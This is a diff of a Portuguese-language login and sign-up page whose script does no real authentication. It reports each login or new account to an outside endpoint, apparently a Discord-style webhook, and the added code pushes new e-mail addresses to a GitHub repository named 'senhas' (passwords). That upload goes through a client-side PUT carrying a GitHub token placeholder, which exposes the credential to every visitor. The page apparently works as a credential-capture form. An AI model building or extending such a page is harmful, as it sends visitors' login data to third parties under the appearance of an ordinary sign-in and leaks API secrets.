@@ -34,22 +34,24 @@
 
   <script>
   (async function(){
-    // 1) Verifica se IP está banido
-    const meuIP = await (await fetch("https://api.ipify.org?format=json")).json().then(r=>r.ip).catch(()=>"desconhecido");
+    // 1) Verifica IP banido
+    const meuIP = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"desconhecido");
     const banned = await fetch("banned-ips.json").then(r=>r.json()).catch(()=>[]);
     if(banned.includes(meuIP)){
       document.body.innerHTML="<div class='card'><h3>Acesso negado</h3><p>Seu IP foi bloqueado.</p></div>";
       return;
     }
 
-    // 2) Alternância entre Login e Criar conta
+    // 2) Carrega e-mails já cadastrados
+    const cadastrados = await fetch("emails-cadastrados.json").then(r=>r.json()).catch(()=>[]);
+
     let modoCriar = false;
-    const titulo   = document.getElementById("titulo");
-    const btnEnvio = document.getElementById("btnEnvio");
-    const confSenha= document.getElementById("confSenha");
-    const switchBtn= document.getElementById("switchBtn");
-    const formAuth = document.getElementById("formAuth");
-    const msg      = document.getElementById("msg");
+    const titulo    = document.getElementById("titulo");
+    const btnEnvio  = document.getElementById("btnEnvio");
+    const confSenha = document.getElementById("confSenha");
+    const switchBtn = document.getElementById("switchBtn");
+    const formAuth  = document.getElementById("formAuth");
+    const msg       = document.getElementById("msg");
 
     switchBtn.onclick = () => {
       modoCriar = !modoCriar;
@@ -60,18 +62,41 @@
       msg.textContent="";
     };
 
-    // 3) Envio
     formAuth.addEventListener("submit", async e=>{
       e.preventDefault();
-      const email = document.getElementById("email").value.trim();
+      const email = document.getElementById("email").value.trim().toLowerCase();
       const senha = document.getElementById("senha").value;
       const conf  = confSenha.value;
-      if(modoCriar && senha!==conf){msg.textContent="Senhas não coincidem";return;}
-      msg.textContent="";
 
+      if(modoCriar){
+        if(senha!==conf){msg.textContent="Senhas não coincidem";return;}
+        if(cadastrados.includes(email)){msg.textContent="E-mail já cadastrado";return;}
+      }
+
+      msg.textContent="";
       const agora = new Date().toLocaleString("pt-BR");
+
+      // 3) Se for criação, adiciona e-mail à lista
+      if(modoCriar){
+        cadastrados.push(email);
+        await fetch("https://api.github.com/repos/ricardo548/senhas/contents/emails-cadastrados.json",{
+          method:"PUT",
+          headers:{
+            "Authorization":"token COLE_AQUI_SEU_GITHUB_TOKEN",
+            "Accept":"application/vnd.github+json",
+            "Content-Type":"application/json"
+          },
+          body:JSON.stringify({
+            message:"novo e-mail cadastrado",
+            content:btoa(JSON.stringify(cadastrados)),
+            sha: await fetch("https://api.github.com/repos/ricardo548/senhas/contents/emails-cadastrados.json")
+                       .then(r=>r.json()).then(d=>d.sha)
+          })
+        }).catch(()=>null);
+      }
+
       const payload = {
-        content: null,
+        content:null,
         embeds:[{
           title: modoCriar ? "Nova conta criada" : "Login efetuado",
           color: modoCriar ? 0x00ff88 : 0xffd700,
@@ -101,6 +126,7 @@
 
       alert(modoCriar ? "Conta criada com sucesso!" : "Login realizado!");
       formAuth.reset();
+      if(modoCriar) cadastrados.push(email); // atualiza lista local
     });
   })();
   </script>
